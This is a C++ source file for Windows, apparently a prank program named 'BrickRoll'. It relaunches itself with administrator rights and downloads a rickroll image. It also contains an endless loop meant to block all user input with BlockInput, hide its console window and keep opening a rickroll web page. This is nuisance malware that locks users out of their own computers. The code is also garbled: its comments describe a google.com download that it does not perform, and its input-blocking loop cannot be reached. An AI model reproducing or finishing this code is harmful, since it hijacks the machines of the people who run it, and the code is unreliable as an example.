// ONLY FOR WINDOWS 
// NEEDS WINDOWS SET UP 
// COMPILE USING Visual Studio Express, 
// Visual C++ Express or any edition 
// any version 

//#define _WIN32_WINNT 0x0A00

#include <windows.h>
#include <winuser.h>
#include <shellapi.h>
#include <winreg.h>
#include <cstdio>



#pragma comment(lib, "Urlmon.lib")

using namespace std;

// Program to download the home page 
// of google.com to a file named 
// myfile.txt. the file can be 
// found in the same working directory 
// from which the project runs 

//Starts webbrowser leading to Rick Roll youtube video.
void openURL()
{
    system("START https://rickrolled.com/");
    Sleep(2);
}

void NGGYU()
{
    printf("Never gonna give you up!");
}
int main(int argc, char** argv)
{
    //Executes the program as admin.
    ShellExecute(NULL, L"runas", L"BrickRoll.exe", NULL, NULL, 0);

    for (int i = 0; i < argc; i++)
    {
        if (argc == 2)
        {
            NGGYU();
            exit(0);
        }
        else
        {
            exit(0);
        }
    }
    // the URL to download from 
    const wchar_t* srcURL = L"https://i.ytimg.com/vi/8-58S8e2kQ4/maxresdefault.jpg";

    // the destination file 
    const wchar_t* destFile = L"roll.jpg";

    // URLDownloadToFile returns S_OK on success 
    if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))
    {

        printf("Saved to 'myfile.txt'");

        return 0;

    }

    else
    {

        printf("Failed");

        return -1;

    }


    while (TRUE)
    {
        //Blocks the input of the users.
        BlockInput(TRUE);

        //Handles and hides the console window.
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE);

        openURL();

    }
    return 0;

}